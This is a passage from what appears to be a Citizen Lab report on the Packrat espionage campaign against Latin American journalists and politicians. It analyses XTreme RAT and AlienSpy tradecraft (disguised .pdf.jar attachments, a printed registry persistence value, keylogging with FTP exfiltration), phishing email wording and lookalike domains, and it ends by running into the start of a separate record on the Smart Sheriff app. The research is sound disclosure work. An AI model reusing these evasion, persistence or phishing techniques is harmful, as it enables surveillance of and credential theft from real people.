presumably to install second stage malware\n\n\n \nImage 17: Installation of the XTreme RAT keylogger module\nXtreme RAT operation and keylogging functionality\nThe Xtreme RAT implant sniffs the clipboard contents via the keylogger window, using a clipboard viewer that it also installs. The viewer receives the window message WM_DRAWCLIPBOARD every time the clipboard changes, and provides access to Clipboard contents. Clipboard and keylogger data is dumped to a .dat-file that, along with the configuration file (.cfg), is located in the […]\\Application Data\\Microsoft\\Windows folder for the current user. Both filenames are dictated by XTreme RAT’s configuration.\nXTreme RAT data files\nC:\\Documents and Settings\\Administrator\\Application Data\\Microsoft\\Windows\\RJokLSZBj.cfg\nC:\\Documents and Settings\\Administrator\\Application Data\\Microsoft\\Windows\\RJokLSZBj.dat\nThe dump file is exfiltrated via push to FTP. XTreme RAT comes with preconfigured FTP server credential placeholders (ftpuser/ftppass) to log on to ftp.ftpserver.com, which are then switched for updated values received from the C&C at runtime.\nThe XTreme RAT implant also creates a mutex named following the same naming scheme as configuration and dump file (e.g. “RJokLSZBjPERSIST”). The RAT’s configuration is fetched from the .rsrc-section and encrypted using RC4, with the key “CONFIG”. The same algorithm and key combination has been seen in use before in other variants of XTreme RAT.\nThis variant of XTreme RAT uses explorer.exe as a container for remote threads to carry out specific functions. Thread injection can happen on at least three occasions.\nPossible injections of explorer.exe by XTreme RAT:\n\nA ‘watchdog’ thread to restore persistence keys, and to locate and run the infector binary. To increase stealth, the dropping module changes the timestamp of the dropped infector.\nA thread for deleting of XTreme RAT’s files on disk\nThe entire keylogging code and FTP push functionality\n\n3.2: 2014- 2015 AlienSpy Dominates\nOver the past two years, Packrat has been using an evolving family of off-the-shelf malware known as AlienSpy. The software began as the free RAT “Frutas,” and was identified in 2013 during a campaign in Mexico. This was subsequently adapted for commercial sale as the “Premium RAT” Adwind. Adwind could be purchased for $75 for a single license, and up to $250 for multiple licenses. Then, by 2013, AdWind was renamed UNRECOM (UNiversal REmote COntrol Multi-platform), and was detected in targeted attacks in the Middle East.\nThe software was most recently branded “AlienSpy,” and was again found by security researchers in targeted spying operations. At the time of this report, the latest re-packaging of this RAT is known as JSocket. For the purposes of this report, we’ll refer to all variants of this spyware as “AlienSpy.” AlienSpy is a relatively full-featured RAT with a range of features, such as recording the victim’s keystrokes, audio eavesdropping via a device’s built-in microphone, remote viewing of the desktop, and the ability to turn on a victim’s webcam “without user notification.” Alienspy has been extensively analyzed by malware researchers, including reports by ProofPoint and Fidelis.\n3.2.1 Packrat’s Alienspy Deployment\nFrom 2014 to early 2015, Packrat’s preferred technique was to send AlienSpy implants as attachments in phishing emails with the extension ‘.pdf.jar.’ The default setting in Windows is to hide file extensions, thus making it appear to be a “.pdf” file. With some minor differences, all the samples from this time period are built in a similar manner. There’s an outer .jar (Java archive) file containing a folder named META-INF and two files: Favicon.ico and Principal.class. Upon execution, Principal.class unzips the contents of “Favicon.ico” (not an icon file, but a .zip archive), and looks for a filename containing “.jar”.\nContents of Favicon.ico\n0doc.jar\n1Estrictamente Secreto y Confidencial.pdf\nOnce it finds the right file (in this case 0doc.jar), it drops it to a randomly-named temp file starting with a constant string and invokes Java to run it.\nInside the .jar file from “Favicon.ico” \nMETA-INF/MANIFEST.MF\nMANIFEST.MF\nID\nplugins/Server.class\nMain.class\nEstrictamente Secreto y Confidencial.pdf\n“Main.class” is obfuscated using Allatori, a Russian-origin JVM obfuscator used by AlienSpy.\nThis reads part of an RC4 key from the file “ID.” To this it appends a constant string, then uses the full RC4 key to decrypt the contents of MANIFEST.MF, which yields the actual Adwind implant JAR file. Others have written about the operation and deobfuscation of Allatori, including how to deobfuscate it, here, here, and here.\nAlienSpy in MS Office Documents\nIn 2015, Packrat started sending AlienSpy implants embedded in .docx files. The method used to obfuscate these files is more complex, but ultimately similar to previous techniques. Uncompressing an infected MS Word document reveals a file named “oleObject1.bin” under the directories word/embeddings. Opening this file, which is a jar, reveals:\na\nabcdefghijka.class\nabcdefghijkf.class\nabcdefghijkj.class\nabcdefghijks.class\nabcdefghijku.class\nabcdefghijkz.class\na.txt\nb.txt\nc.dat\nkjmhs\nMain.class\nMETA-INF\nSimilar to the obfuscation described above in Packrat’s earlier uses of AlienSpy, half the decryption key is in a.txt. The other half is a string which is decrypted iteratively by the abcdefghijk[a,f,j,s,u,z].class files with the method and class names from the caller.\nPersistence is achieved by adding the following registry value:\n“reg.exe” (Access type: “SETVAL”, Path: “\\REGISTRY\\MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN”, Key: “JAVASE”, Value: “”C:\\Users\\PSPUBWS\\Cas436FlashJava\\RoUndCuBe\\bin\\javaw.exe” -jar “C:\\Users\\PSPUBWS\\Cas436FlashJava\\Cas436FlashJava\\Cas934FlashJava.\n3.2.2 Adzok makes an appearance\nBetween 2014-2015, Packrat also used Adzok – Invisible Remote Administrator. Similar to AlienSpy in functionality, the java-based Adzok is apparently from Bolivia. The premium version costs $990, but it appears that Packrat is using the “free” version. This version of Adzok does not use obfuscation, which makes it possible to simply uncompress the jar files within the docx and read the clear-text configuration file. Given the obfuscated nature of the other RATs that Packrat has used, their use of Adzok is surprising. It is possible that they were having stability, compatibility, or detection problems with other RATs and that Adzok served a specific requirement.\n4. Packrat’s Persistent Phishing Campaigns\nPackrat is active in phishing, often against the same groups and individuals whom they target with malware. For example, when examining one target of malware attacks, we found this individual had been targeted by dozens of phishing attempts by Packrat during the same period. The same domains and fake identities that Packrat uses to seed malware are also used to serve phishing, although Packrat also maintains dedicated phishing sites and servers. While phishing e-mails appeared to be regularly sent, we also observed particular cases of the phishing apparently sent to targets in response to contacts they made during our investigation.\nWe have been able to achieve the most systematic visibility of Packrat’s campaign against Ecuadorian targets, but have found evidence of targeting in neighboring countries including Venezuela. Packrat uses both e-mails and social media messages, as well as SMSes to send phishing messages.\nThis section describes these phishing campaigns, and describes both Politically-Themed and Non-Politically Themed phishing attacks.\n\n\n\nCategory\nExample Domain\nNote\n\n\nPolitics & News\nlavozamericana.info\nFake news website\n\n\nGovernmental – Ecuador\nasambleanacional-gob-ec.cu9.co\nLookalike to the Ecuadorian National Assembly’s e-mail login\n\n\nPolitical Movement – Ecuador\nmovimientoanticorreista.com\nFake political movement\n\n\nFree E-mail\nmgoogle.us\nFake Google login\n\n\n\n4.1 Non-Politically Themed Phishing Content\nOne of the most common phishing techniques is lookalike communications from popular webmail and social media sites containing requests for password verification, notifications of unauthorized logins, and so on. Packrat uses a wide range of templates for the major email providers, including Gmail, Yahoo and Hotmail. A majority of the e-mails are in Spanish. The messages are typically personalized to the targets, including both their names and e-mail addresses.\n \nImage 18: Example phishing email\nTranslated Message\nFrom: Gmail Team no.response.delivery.es@gmail.com\nSubject: [Victim Name], you have a pending warning !\nTo: [victim email]\n[Victim email],\n[Victim Name]for security reasons we request that you verify your account below.\nTo ensure proper use of your account, we request that you verify it.\nClick here to verify your account.\nDepending on the attack, the phishing either contains a direct link to the phishing URL, or uses a shortener.\n4.1.1 Most Recent Non-Political Phishing\nRecently, the attackers appear to have slightly varied their technique. We have observed them making extensive use of tinyurl as a shortener, as well as moving their phishing pages to the free host cu9.co. The attackers may have concluded that using a free provider reduced costs and increased flexibility.\nExample recent phishing URL and shortener:\ntinyurl.com/nww83ov Yields: main-latam-soporte-widget-local.cu9[dot]co\n4.1.2 Example Non-Political Phishing SMSes\nA number of Packrat’s targets also received phishing SMSes. The SMSes often use similar language to the phishing e-mails, and in some cases use the same shortened URL. In other cases, the attackers push harder, warning the targeted user that their accounts will be terminated if they fail to follow the link. In at least one case we observed that the messages contained improperly formatted e-mail addresses.\nImage 19: Example of non political phishing\n4.2 Politically Themed Phishing\nWe observed a wide range of e-mails and messages that contained content with political overtones. Packrat takes two basic approaches in the attacks we have examined. First approach: create fake political and media organizations. Second approach: impersonate well-known groups and high-profile individuals. Attacks typically took the form of messages and e-mails containing information either in ‘solidarity,’ upsetting information, or other relevant news. A majority of what we observed seemed to be crafted to appeal to opposition elements.\nWhile much of the phishing seems to mimic common free webmail and social media sites, in specific cases, Packrat mimicked e-mail services of high-profile targets, like the Ecuadorian National Assembly.\n4.2.1 Targeting Ecuadorian Parliamentarians\nA group we believe to be Packrat has operated a phishing campaign that mimics the Ecuadorian national assembly’s webmail portal. This malicious site prompts the target(s) to enter their email credentials, which are captured via formmail, a technique seen repeatedly in the phishing pages we identified (see below).\nasambleanacional-gob-ec.cu9.co\nThe legitimate domain is:\nhttp://mail.asambleanacional.gob.ec/\n4.2.2 A Typical Credential Harvesting Page\nWhatever the bait, the links on the messages typically lead victims (often via a shortener) to a lookalike domain for a free email provider. During the summer of 2015, a frequently observed domain was a lookalike for Google, although there have been many others:\nmgoogle.us\nWhile the attacks were active, mgoogle.us hosted a Spanish-language lookalike Google login.\nImage 20: mgoogle.us hosted a Spanish-language lookalike Google login\nOnce a victim’s credentials are entered, they are shown a Spanish language note “confirming” that their gmail has been “unblocked” and thanking the victim for “choosing us.”\nImage 21: A Spanish language note “confirming” that their Gmail has been “unblocked”\nIn other cases, Packrat sends “confirmation” emails to the original victim, congratulating them on “successfully” verifying their account after credentials are entered. In specific cases, we found that this e-mail arrived several hours before phished accounts were accessed.\nWhile the phishing has used different tools to harvest credentials, we find that Packrat makes repeated use of the legitimate online website form service formmail.com to receive phished credentials. Formmail is a legitimate HTML-based form processor that receives the contents of data entered into forms, then sends them to an e-mail address.\n4.3 A Sample of Phishing & Malware Seeding Sites\nThe attackers control a range of domains that they use to serve both phishing and malware. This section outlines elements of this infrastructure. A more complete list is in Appendix D, but we describe certain domains of interest here. The phishing page mgoogle.us, for example, has resolved to a range of IPs, including:\n\n\n\nIP\nFirst Seen\nLast Seen\nWHOIS\n\n\n198.12.150.249\n5/19/2015 6:16:00\n9/4/2015 9:51:00\nGodaddy\n\n\n50.63.202.57\n9/4/2015 12:52:00\n10/8/2015 21:44:00\nGodaddy\n\n\n\nOf these IPs, the first (198.12.150.249) is particularly interesting. We find that the same IP was used to host a range of other suspect domains with similar themes. For a full list of associated domains, see Appendix D. While some of these domains are lookalikes for logins, or update pages (e.g. sopporte-gmail.com or login-office365.com) others seem to have a more political angle.\nWHOIS\nName Pedro Luis\nOrganization Reterg is\nAddress teredotr\nCity berlin\nState berlin\nCountry DE Germany\nPhone +49.454545445\nPrivate no\nThe registrant of the site is enripintos123@outlook.es, whom we find listed as the registrant for a range of other domains. All but two are lookalike to the login pages of major online services, or suggestive of updates to services like Java and Android (see Appendix D). The two exceptions are lavozamericana.info and pancaliente.info (see Section 6. Possible Deception Operations). Both of those domains were registered within the timeframe of other registrations of lookalike or confirmed phishing domains.\n4.3.1 Lookalike Fake News Sites\nThe website Ecuador En Vivio (ecuadorenvivo.com) is a legitimate news site, however the attackers control the lookalike ecuadorenvivo.co domain. Packrat has used this fake domain to send emails to targets, either containing attachment-based malware, or links to the site which has also been used to seed malware via a plugin error.\nA Twitter user spotted the fake plugin notification in May 2015 and alerted their followers, and included a screenshot purporting to show one of the fake plugin alerts.\nImage 22: Fake plugin notification\nSimilarly, Focus Ecuador (focusecuador.net) is a genuine news website, however the domain focusecuador.tk, is controlled by the attackers, and has been observed seeding malware using a fake popup. Examination of the IP hosting focusecuador.tk (193.105.134.27) reveals a long list of obvious lookalike domains (See Appendix D).\n4.3.2 A Fake News Organization: The American Voice?\nA second interesting domain is lavozamericana.info, which is no longer active. However we were also able to find a Twitter identity and string of tweets suggesting that there may have been an effort to establish the legitimacy of the site.\nhttps://twitter.com/voz_americana\nInterestingly, the fake identity appears to have had at least some success, as some of the followers of the account appear to be genuine. While the site is no longer active, Google’s cache indicates that a phishing page was hosted on the site.\nImage 23: Google’s cache indicates that a phishing page was hosted on the site\nWhile we have received reports that individuals targeted by Packrat lost access to their iCloud accounts during the timeframe of this attack, we have been unable to verify conclusively whether Packrat was responsible.\n4.3.3 A Fake Opposition Movement\nA number of the targets we identified had received e-mails and messages purporting to come from movimientoanticorreista.com, including the example Attack 1 above. The same domain was also mentioned in a recent report by an Ecuadorian NGO of malware attacks against journalists in Ecuador. We found malware seeding messages associated with this domain, typically sent by movimiento.anti.correista@gmail.com.\nAnother Anti Correa Movement E-mail\nDe: Movimiento Anti Correista <movimiento.anti.correista@gmail.com>\nFecha: [REDACTED: April 2015]\nAsunto: DOCUMENTOS FILTRADOS DEL GOBIERNO CORREISTA – EL SILLON MILLONARIO Y LAS ACTIVIDADES CORRUPTAS\nPara: [REDACTED]SALUDOS ESTIMADO,Compartimos con usted nuestro nuevo sitio web en el cual estaremos publicando información del corrupto gobierno de Rafael Correa.DESCARGUE LOS DOCUMENTOS DE:www.movimientoanticorreista.com\n\nTranslated E-mail\nFrom: Anti Correa Movement <movimiento.anti.correista@gmail.com>\nSubject: LEAKED DOCUMENTS FROM THE CORREISTA GOVERNMENT – THE ARMCHAIR MILLIONAIRE AND CORRUPT ACTIVITIES\nTo: [REDACTED]ESTEEMED GREETINGS,We are sharing with you our new website where we will publish information about the corrupt government of Rafael Correa.DOWNLOAD DOCUMENTS:www.movimientoanticorreista.com\n4.4 A Window Into Campaign Scope\nSeveral moves by Packrat gave us access to some more systematic information about the scope of their attacks. During much of 2015, we observed that Packrat regularly used the same bit.ly link in a range of attacks.\nhttp://bit.ly/1wl3YE2\nThis link was created Oct. 31, 2014 by an anonymous sharer. Examining statistics for the bit.ly link, we were able to see a superficial overview of the volume, timeframe, and basic geographic distribution of clicks.\nImage 25: An overview of the volume, timeframe, and basic geographic distribution of clicks\nThe distribution of clicks is particularly interesting, and suggests that a majority of the hits were located in Ecuador, with others in Argentina, Germany, the United States, Spain, Uruguay, and Venezuela. The absence of Brazil is not necessarily surprising, as it is likely that the attackers, if they continue to phish in Brazil, may be using separate, Portuguese language sites. This provides an indirect window into the location of Packrat’s targets.\nA majority of clicks (322) came from direct link clicks, rather than link shares elsewhere. While this particular bitly link was not extensively clicked on social media sites, Packrat does use social media for some seeding.\n4.5 Note: Lots of Phishing, Not All of it Linkable\nThe investigation yielded a high volume of  Spanish-language phishing attacks against the same individuals that Packrat targeted, however for a number of reasons we were unable to link much of the phishing activity to Packrat.  One of the most notable and high volume campaigns that we identified used the domain gmail.com.msg07.xyz and masqueraded  as a range of account notifications from popular providers including Gmail.  Typically these messages displayed as originating from e-mail addresses like “no-responder@supportgmai1.com.”   In some cases, individuals received these messages almost weekly over long periods of time.\n5. Possible Deception Operations\nNot all of the domains associated with this group appear to have been built to spread malware, or to trick victims into entering their passwords. Several domains are extensively built out, and currently maintained, which appear to be designed to convey the impression of active, news media sites. Some of these sites contain ‘original’ news stories and ‘leaks’ about political figures. At least two of these sites seem Venezuela-specific, while a third is Ecuador-oriented.\nWhat makes these three fake organizations exceptionally interesting is that we have found no evidence that they are used to seed malware or conduct phishing, either directly, or as pretexts for messages. While it may be that we simply lack visibility on the targeting, it may be that the pages and identities serve another function. They may be attempts to seed false information, or might serve as watering holes to attract individuals that Packrat or its sponsors wish to monitor. They may also be coupled with other operations on which we have no visibility.\n5.1 Anti-Chavez: The Very Strange Case of pancaliente.info\nUpdate: immediately prior to the publication of this report the Pancaliente.info site went offline.  The site is still viewable in Google’s cache.  The second domain of this type (chavistas24.com) remains online.\nOne of the most interesting domains also hosted on 198.12.150.249 is pancaliente.info. At first glance this is a Venezuela-focused news and information site. Unlike all of the other sites hosted on this IP that we could verify, this site appeared to have a large volume of original content that was presented in a news format.\nNevertheless, the site has many links to the other domains. While the domain registration is currently masked, the registration e-mail is shared with other phishing sites.\n\n\n\npancaliente.info\nGoDaddy.com,LLC(R171-LRMS)\nenripintos123@outlook.es\nns1.hostinger.ru\n10/25/2014\n49454545445\n\n\n\nThe registration can be verified, although pancaliente.info’s WHOIS has since been made private.\n \nImage 26: Pan caliente website as it appeared in October 2015\nExamining more closely, much of the content seems to be intended to appeal to Venezuelans at home and abroad who oppose the Partido Socialista Unido de Venezuela (PSUV: the party of Hugo Chavez). Some of the reports are intriguing because they describe private documents seemingly obtained by the site (and of questionable veracity), but without further information about their origins.\nIn other cases, the site has published purportedly “leaked” documents. Many of these stories are critical of individuals linked to the PSUV. Many reports also concern the “Expat” community of Venezuelans who oppose the regime from overseas, especially the diaspora in Spain.\nPanCaliente is referenced elsewhere online, such as an apparently leaked document hosted on Slideshare. Some of their reports also appear to have been excerpted or cited by other online news sites.\nAlthough there seems to be a great deal of content, PanCaliente’s articles do not have bylines. While the site is linked with a very active Twitter account (https://twitter.com/pancalienteve), the associated Facebook profile (facebook.com/pancalienteok) is sparse. The WayBack Machine makes it clear that PanCaliente has only recently become active.\nImage 27: The Wayback Machine on Pan caliente\nInterestingly, some of the first reports published on the site appear to have been written when the site was being demoed as having a different name and identity “Venezuela365.com.”\n \nImage 28: Early logos, still visible in the website’s directory structure\n \nImage 29: Variation on the current PanCaliente logo\nThe many images of this alternate logo as it went through its iterations are publicly visible. Also still online is at least one report that still refers to the site as venezuela365. Interestingly, that first ‘report’ refers to “secret” information, including reproducing a purported cheque, without explaining its provenance.\nhttp://pancaliente[.]info/los-negocios-secretos-de-leocenis-garcia-y-gonzalo-tirado/\n“García demandó a Tirado en un corte de Miami cuando el empresario le dio al periodista un cheque falso al cual Venezuela365 tuvo acceso.”\nThe source of this page also contains links to the now-defunct venezuela365.com\n“http://venezuela365.com/wp-content/uploads/2014/10/tirado-g-300×169.jpg“\nAn identically named image is now hosted on pancaliente.info, in an identical directory.\nThe venezuela365.com domain was registered behind DomainsByProxy, however previous WHOIS names Sistekon Corp as a prior registrant. Sistekon Corporation seems to now be defunct, although its information is still on archive.org, and indicates that it develops IT software as well as selling various security solutions. Given that the domain expired in 2013, but was re-registered in 2014 at around the same time as pancaliente.info, the link may be coincidental.\nWe found no evidence that PanCaliente or venezuela365 was ever used to seed malware or conduct phishing attempts, either directly, or as a pretext for malicious content.\n5.2 And Pro-Chavez: Chavistas 24.com\nThe domain, chavistas24.com, which seems to refer to supporters of former Venezuelan president Hugo Chavez, also has a range of content that is apparently supportive of the party.\n \nImage 30: Screenshot of Chavistas24.com showing articles tagged “Traitors of the Revolution”on Chavistas24.com\nChavistas24.com similarly has an associated Twitter account that pushes out tweets, mostly referencing stories published on the website.\n https://twitter.com/chavistas24/\n \nImage 31: The Chavistas 24 Twitter Feed\nWe found no evidence that chavistas24.com was used to phish or send malware, either directly, or as a pretext for malicious content or messages.\n5.3 Seeking Angry Police?\nPackrat appears to be interested in attracting dissatisfied members of Ecuador’s National Police, and has created a website (justicia-desvinculados.com) and social media identity built around “Los Desvinculados,” referring to police let go from Ecuador’s National Police, possibly in the context of corruption inquiries. The website, which also includes a login section, contains news and highly critical reports about the Ecuadorian government.\nEcuador’s police have previously been involved in protests over benefit cuts that some have seen as one of the strongest threats to Ecuadorian President Rafael Correa’s rule.\nImage 32: Screenshot of Los Desvinculados website\nThe social media component of this creation, including a Twitter page of the same name (twitter.com/justdesvincula2) further develops the identity.\nImage 33: Screenshot of Desvinculados Twitter page\nAs with the two other operations described in this section, we have been unable to identify malware or phishing associated directly or indirectly with Justicia Desvinculados.\nPart 6: The Challenge of Attribution\nThe evidence presented in this report points to a coordinated and persistent campaign with a regional focus. Naturally, this raises questions about attribution. This section assesses two competing hypotheses: Hypothesis 1: Packrat is State-Sponsored and Hypothesis 2: Packrat is Not State-Sponsored. For each hypothesis we provide one or more scenarios that we consider plausible versions of the hypothesis.\n6.1 Hypothesis 1: Packrat is State-Sponsored\n6.1.2 Examining the Target List\nThe list of known targets is full of influential people whose activities could have an impact on the domestic and regional political standing of regimes in several countries. Where we have been able to identify individuals who have been targeted, we find vocal, strong regime critics and independent journalists in Ecuador and Argentina. Interestingly, Packrat has also targeted parliamentarians, and others within the government of Ecuador. This diversity of targets with (possibly) opposing positions is a common theme in the data.\nIn other cases, we find phishing and malware-seeding websites, emails and messages with obviously political themes. Packrat created fake political organizations, whose identities, logos, and websites are then used to seed phishing attacks and malware. These materials seem designed to appeal primarily to both critics and (some) members of governments in Ecuador and Venezuela. We also believe that there are targets in other countries, including Brazil, but have limited information about who they are.\nThese are the kinds of targets who would be of interest to an intelligence or security service in the region, especially one not equipped to directly and passively monitor all of the communications of their targets. The multiple nations reflected in the seeding and targeting suggest, further, that the sponsor(s) of this activity would be interested in the opponents of several regimes.\n6.1.3 Motivation for Disinformation Campaigns\nWe see a range of fake websites touching on political themes, but not obviously used to seed malware. While some of these sites share the same registrations as malware serving sites, they differ by having extensive content, and show no evidence of having hosted malicious files or phishing pages, or of having been used as pretexts for campaigns, as is common with Packrat. The content reflects extensive effort, as does the backstopping with identities on social media sites.\nThere seem to be three possible explanations for these pages. First, the pages may be an attempt to create credible fake organizations that can be used to actively promote disinformation, interspersed with real news. Second, the pages may serve as honeypots, used to attract targets, either to identify and possibly manipulate them, or to build trust that could then be used in malware attacks. Finally, the pages may be part of information gathering operations that have other components of which we are not aware.\nWhile it would not be surprising for a political movement or well-funded set of interests to engage in these activities in one country, Packrat has done so in multiple countries. It is not clear what group beyond a state, would be interested in this kind of activity, and have the resources to support it.\n6.1.4 Ability to Pay\nThe hosting and domain registrations necessary to maintain this campaign infrastructure for more than seven years clearly have associated costs. The human labor associated with creating and maintaining the many fake websites we have observed is also costly. This is especially true for the websites with substantial “original” content, such as PanCaliente. Finally, the extensive and personalized targeting clearly reflects substantial human effort.\nThe cost of this campaign suggests that Packrat is either well-resourced, or has sponsors who can pay for server space and time, as well as the costs of Packrat’s operators. We see no evidence of targeting with out-of-scope seeding materials, such as industry, business or the financial sector. Given the cost of the campaign, it is difficult to see who, beyond a state or an organized entity with political aspirations, would both want the information, and be in a position to pay for it.\n6.1.5 Clues That Packrat Feels ‘Safe’\nWhen the first reports were published on the Nisman and Argentine targeting in early 2015, some of Packrat’s infrastructure was exposed. Nevertheless, much of the infrastructure has remained online. From a pragmatic point of view this makes sense. If Packrat had successful implants operational at that time, taking the infrastructure offline would close that access. Packrat would have had to engage in a process of pushing out updated implants to the infected computers that connected to a new host. This time-consuming process would also be prone to failure and possible detection.\nIf Packrat were afraid of criminal punishment in their country of residence, it would have been natural to take the servers offline once exposed. Their interlinked infrastructure can be used to investigate, as we did, the broader structure of their campaigns. In the hands of a law enforcement agency, these active servers could potentially be traced back to the responsible parties.\nThe fact that the servers remain online suggests that Packrat is operating purely on practical concerns, which do not include fear of the authorities. We take this to suggest that they may enjoy a degree of protection in the country or countries in which they operate.\nWhile it is less conclusive, their taunts of a Citizen Lab researcher also suggest a degree of confidence that these actions will not have consequence for them. Given their decision to keep their infrastructure online, this researcher may not have been the first (or the last) to bother them by analyzing one of their attacks.\n6.1.6 Two Scenarios of State Sponsorship\nIn this section we present two possible scenarios for state sponsorship. The data we have presented in this report could be explained by either of these possibilities (or by the scenario outlined for Hypothesis 2: Non State Sponsor).\nScenario 1: A Single State Sponsor\nThere are several possible explanations for the targeting we see. It is possible that Packrat is working for a single intelligence or security service, and that these activities all reflect that service’s targeting. Such a service would, potentially, wish to keep tabs on many groups, including both its opponents, the opponents of friendly governments, and possibly friendly governments themselves.\nThe strong representation of ALBA (Bolivarian Alternative for the Americas) countries, and their recent “fellow-travelers” (Argentina included, although it has recently changed ruling parties), among the locations of targeting may be instructive. The leaders of these countries are widely seen as political allies on the leftist spectrum, although Argentina’s most recent election in November 2015 elected a president who seems to reject this relationship. The governments of Ecuador and Venezuela, meanwhile, are especially close allies, although it is unclear how this will evolve given Venezuela’s very recent elections.\nSome may jump to interpret public reports of malware attacks targeting opponents of the Ecuadorian government as conclusive evidence of official Ecuadorian government involvement with Packrat. They may also point to previous reports that Ecuador’s domestic intelligence agency reportedly used the commercial trojan made by Hacking Team to target at least one dissident. However, the presence of targets within the Ecuadorian parliament and possibly elsewhere in the government challenges any simplistic theory of Ecuadorian government sponsorship, but does not completely rule it out as intra-governmental rivalries or other dynamics could be at play.\nScenario 2: Mercenary Work for One or More Government Sponsors\nThe range and diversity of regional targets, which includes the opponents of several regimes, as well as those same governments supporters in some cases, could be taken as indicating that the threat actor group is reusing the same infrastructure for campaigns on behalf of multiple client governments at once. It is possible, for example, that Packrat is in the “address book” of multiple clients, and reuses the same infrastructure for multiple campaigns.\n6.2 Hypothesis 2: Packrat is Not a State Actor\nAlthough some of the evidence we have outlined above provides circumstantial support for state sponsorship, other features of Packrat’s activity are not so clear. This section briefly lays out the most salient of these pieces of evidence: lack of technical sophistication. We evaluate this fact, and then briefly note a potential scenario for non-state sponsorship.\n6.2.1 Lack of Use of technically sophisticated tools\nThe malware used by this campaign is primarily Commercial Off-The-Shelf (COTS) RATs, not boutique or tailor-made implants. Nor is it the commercial malware sold to governments by companies like FinFisher and Hacking Team. Additionally, the attackers do not make use of exploits for their malware seeding. The lack of exploits very likely hampers the efficacy of many attacks. For example some of the bait documents instruct victims to double click on an icon in the document. This is cumbersome, and is more likely to result in failed attacks or discovery. A threat actor with the direct support of a government might have access to more sophisticated malware, and exploits.\nHowever, it is well documented that not all government-linked malware groups make use of sophisticated malware or exploits. Prior research by Citizen Lab, for example, has shown that state-sponsored groups targeting civil society often use the minimum necessary technical sophistication in their campaigns. Why use more sophisticated or esoteric technique when simpler tools suffice? Other research on government-linked hacking groups in the Middle East also suggests that these groups persist in exploit-less targeting, perhaps because it is inexpensive, and that it nevertheless achieves a minimum satisfactory level of infections.\nUltimately, the reliance on COTS malware and lack of exploits does not enable us to draw many conclusions. However, it does have one feature worth noting: by extensively obfuscating COTS malware, the attackers are nevertheless able to deliver malware that is effective at evading detection while simultaneously being difficult to attribute. That said, since obfuscated malware is also common in criminal hacking, the pairing of crimeware and obfuscators does not tell either way towards this hypothesis.\n6.2.2: Scenario: Non-State Group\nIt is impossible to reject the possibility that Packrat is a criminal or non-state group. Such a group could, in theory, be a supporter of an opposition political movement, or have other interests in the critics of regimes. There are a range of powerful non-state groups in South America, including cartels and others involved in illegal trafficking, who would certainly have the ability to pay for these operations. Nevertheless, given the particular targets we are aware of, we are unsure of why these individuals would be of primary interest to groups involved in illegal activities.\nAnother possibility, also unfalsifiable, is that a non-government group with political ambitions is responsible for Packrat. Such a group might be particularly interested in potential allies or sources of instability, as well as governments.\n6.3 Adjudicating between competing hypotheses\nUltimately, this report does not provide sufficient data to conclusively adjudicate between hypotheses. However, we think that the best fit, which is still circumstantial, is that the ultimate recipient of the information collected by Packrat is likely one or more governments in the region.\n7. Conclusion\nThis report described a seven year campaign with targets in several Latin American countries. While there are many well-known threat actors in Latin America, many of the most visible are engaged in cybercrime. What distinguishes Packrat is the extensive and often ingenious targeting of political figures, journalists and others. They are also distinguished by their ability to remain active over such an extended period, seemingly unfazed by discovery.\nPackrat highlights the extent to which multi-year campaigns can be run using limited technical sophistication, and a lot of creativity. From a technical perspective, they rely almost entirely on off-the-shelf RATs and packers to evade antivirus detection. Where they excel is in the time and effort spent to create detailed and moderately convincing fake organizations to seed their malware.\nTheir persistence, and their willingness to keep using domains even after they are exposed suggests that exposure of their infrastructure is not an existential threat. Their threats and taunts are similarly brazen. This strongly suggests, but does not prove, that Packrat operates with a perception of safety.\nUltimately, this report does not conclusively attribute Packrat’s activities, however we hope that by exposing their activities, we have provided encouragement to others to continue to follow the thread.\nNote: The Precarious Position of Media in Latin America\nWhile we discourage a direct link between specific incidents of non-digital harassment of journalists and Packrat, the case highlights the difficult situation faced by journalists and freedom of expression supporters in countries like Ecuador.\nIn Ecuador, for example, numerous observers, including the United Nations Special Rapporteur for Freedom of Expression, have expressed concern that the freedoms afforded to journalists continue to be constricted. In Ecuador journalists, and even cartoonists, have faced apparent retaliation for political speech. Journalist Martha Roldos, for example, had personal e-mails exposed in the press, and recordings of her conversations played in public. Freedom of expression and journalism organization Fundamedios, which has documented over 600 attacks against journalists from 2008-2012, has face forced shutdown. Interestingly, both of these individuals were also targets of Packrat. While we have no evidence linking the perpetrators of these actions to Packrat, nor reason to believe the sponsor is the same, the targeted malware that we describe only adds to the threats these individuals and organizations face.\nFootnotes\n[1] See Appendix B for details.\n[2] bc97437fec7e7e8634c2eabae3cc4832\n[3] Sandboxes include ThreatExpert, Anubis, CWSandbox, JoeBox and Norman Sandbox.

    "description": "On 20 September 2015, the Citizen Lab at the Munk School of Global Affairs, University of Toronto, released a report, “Are the Kids Alright? Digital Risks to Minors from South Korea’s Smart Sheriff Application.” The report detailed results of two independent audits of the privacy and security problems of Smart Sheriff, a parental monitoring application promoted by the South Korean government. In total, 26 security vulnerabilities that could compromise the privacy and security of minors and parents who use the Smart Sheriff application were found in the audits conducted by the Citizen Lab and Cure53, a German-based security audit firm. The vulnerabilities that were identified could be used by an attacker to disable Smart Sheriff accounts, tamper with data, and steal personal information for the application’s entire user base. We also noted several legal and policy issues related to the Smart Sheriff application. Detailed technical [pdf] and legal and policy [pdf] appendices were attached to our report. The first Cure53 audit, undertaken in August 2015, can be found here [pdf].",
    "text": "\n\t\t\t\t한국어 번역본 읽기\nMedia coverage: Associated Press, BBC News, e27, Korea Portal, The Korea Times, Toronto Star, The Seattle Times, The Christian Science Monitor, PC Mag, Bloter (in Korean), Eagle Radio.\nSummary\n\nA second audit of the Smart Sheriff application reveals that there are numerous unresolved security vulnerabilities that put minor children and parental users of the application at serious risk.\nMOIBA, the Korean industry consortium responsible for the Smart Sheriff application, has been slow to respond to the issues raised (of which it was notified more than 90 days ago); the fixes that have been applied do not adequately or effectively address the issues, especially for users; and MOIBA has not communicated transparently to the public about Smart Sheriff’s known risks.\nThe Citizen Lab recommends immediate withdrawal of Smart Sheriff from the public market, and that existing users discontinue their use of the application.\n\nNOTE: On October 31, 2015, Citizen Lab learned that MOIBA removed the Smart Sheriff application from the Google Play Store. However, the Smart Sheriff API remains available and therefore constitutes a continued security risk to users.  Additionally, MOIBA appears to have republished Smart Sheriff under another name (사이버안심존 – translated as “Cyber Safety Zone”) on the Google Play store.  A brief inspection of version 1.7.8 